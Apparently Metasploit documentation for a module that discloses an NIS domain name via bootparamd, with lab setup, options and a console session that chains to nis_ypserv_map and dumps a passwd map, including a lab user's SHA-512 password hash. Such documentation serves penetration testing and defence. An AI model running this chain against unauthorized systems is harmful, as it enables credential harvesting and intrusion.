## Introduction

From the `bootparamd(8)` man page:

> bootparamd is a server process that provides information to diskless clients necessary for booting. It consults the /etc/bootparams file to find the information it needs.

The module documented within will allow a tester to disclose the NIS
domain name from a server running `bootparamd`. After knowing the domain
name, the tester can follow up with `auxiliary/gather/nis_ypserv_map` to
dump a map from a compatible NIS server (running as `ypserv`).

## Setup

Set up NIS as per <https://help.ubuntu.com/community/SettingUpNISHowTo>.
If the link is down, you can find it via the Wayback Machine.

After that is done, install `bootparamd` however your OS provides it.

Make sure you add a client to the `bootparams` file, which is usually at
`/etc/bootparams`.

Here is an example `bootparams` file (courtesy of
[@bcoles](https://github.com/bcoles)):

```
clientname root=nfsserver:/export/clientname/root
```

You can read the `bootparams(5)` man page for more info.

Lastly, the client should be added to `/etc/hosts` if it isn't already
resolvable.

## Options

**PROTOCOL**

Set this to either TCP or UDP. UDP is the default due to `bootparamd`.

**CLIENT**

Set this to the address of a client in the target's `bootparams` file.
Usually this is a host within the same network range as the target.

**XDRTimeout**

Set this to the timeout in seconds for XDR decoding of the response.

## Usage

```
msf > use auxiliary/gather/nis_bootparamd_domain
msf auxiliary(gather/nis_bootparamd_domain) > set rhost 192.168.33.10
rhost => 192.168.33.10
msf auxiliary(gather/nis_bootparamd_domain) > set client 192.168.33.10
client => 192.168.33.10
msf auxiliary(gather/nis_bootparamd_domain) > run

[+] 192.168.33.10:111 - NIS domain name for host ubuntu-xenial (192.168.33.10) is gesellschaft
[*] Auxiliary module execution completed
msf auxiliary(gather/nis_bootparamd_domain) >
```

After disclosing the domain name, you can use
`auxiliary/gather/nis_ypserv_map` to dump a map from a compatible NIS
server.

```
msf auxiliary(gather/nis_bootparamd_domain) > use auxiliary/gather/nis_ypserv_map
msf auxiliary(gather/nis_ypserv_map) > set rhost 192.168.33.10
rhost => 192.168.33.10
msf auxiliary(gather/nis_ypserv_map) > set domain gesellschaft
domain => gesellschaft
msf auxiliary(gather/nis_ypserv_map) > run

[+] 192.168.33.10:111 - Dumping map passwd.byname on domain gesellschaft:
list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
ubuntu:$6$LXFAVGTO$yiCXi1KjLynOrapuhJE7tKnvdwknDMKiKM7Z8ZB19ht6CHmsS.CbUTm8q0cy5fFHEqA.Sg4Acl.0UtY.Y0JNE1:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
games:*:5:60:games:/usr/games:/usr/sbin/nologin
news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
sys:*:3:3:sys:/dev:/usr/sbin/nologin
backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
systemd-resolve:*:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
sync:*:4:65534:sync:/bin:/bin/sync
systemd-network:*:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
uuidd:*:108:112::/run/uuidd:/bin/false
dnsmasq:*:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
root:*:0:0:root:/root:/bin/bash
sshd:*:110:65534::/var/run/sshd:/usr/sbin/nologin
systemd-bus-proxy:*:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
irc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
messagebus:*:107:111::/var/run/dbus:/bin/false
_apt:*:105:65534::/nonexistent:/bin/false
mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
syslog:*:104:108::/home/syslog:/bin/false
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
systemd-timesync:*:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
pollinate:*:111:1::/var/cache/pollinate:/bin/false
www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
lxd:*:106:65534::/var/lib/lxd/:/bin/false

[*] Auxiliary module execution completed
msf auxiliary(gather/nis_ypserv_map) >
```
